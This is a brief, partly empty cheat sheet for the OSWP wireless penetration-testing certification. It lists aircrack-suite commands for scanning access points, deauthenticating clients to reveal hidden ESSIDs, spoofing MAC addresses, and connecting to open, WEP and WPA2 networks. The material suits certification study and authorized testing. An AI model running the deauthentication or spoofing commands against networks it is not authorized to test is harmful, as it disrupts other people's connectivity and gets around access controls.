# OSWP cheat sheets

This cheat sheet based on "WiFi Hacking Mind Map - v1.0 by Jérémy Brun-Nouvion (https://github.com/koutto)"

## Monitoring
### Find all AP and connected devices
```
airodump-ng <interface> --wps --manufacturer --uptime --band <band>
```

### Monitor target AP
```
airodump-ng <interface> --wps --manufacturer --uptime --band <band> -c <channel> --bssid <bssid> -w res
```
### Unhide ESSID
Set channel
```
iwconfig wlan0 channel <channel>
```
Catch beacon with ESSID
```
aireplay-ng -0 <deauth number> -a <AP MAC> <interface> 
aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> #Some clients ignore broadcast deauthentications. If this is the case, you will need to send a deauthentication directed at the particular client.
```


## WEP attack







## Connect to AP

### Open
```
iw <interface> connect <ESSID>
dhclient <interface>
```

### WEP
```
iw <interface> connect <ESSID> key 0:<key>
dhclient <interface>
```

### WPA2

Dependencies: wpasupplicant
```

wpa_passphrase "<ESSID>" <key> | sudo tee /etc/wpa_supplicant.conf
wpa_supplicant -B -c /etc/wpa_supplicant.conf -i <interface>
dhclient <interface>
```

### WPA enterprise

```
sudo dhclient <interface>
```

## Other
### MAC-spoofing
```
ip link set dev <interface> down
ip link set dev <interface> address <XX:XX:XX:XX:XX:XX>
ip link set dev <interface> up
```
### Prepare Attacker PC (Monitor mode)
```
airmon-ng check kill
airmon-ng start <interface>
```
### Back to normal modee (Managed mode)
```
airmon-ng stop <Monitor interface>
systemctl start wpa_supplicant
systemctl start NetworkManager
```
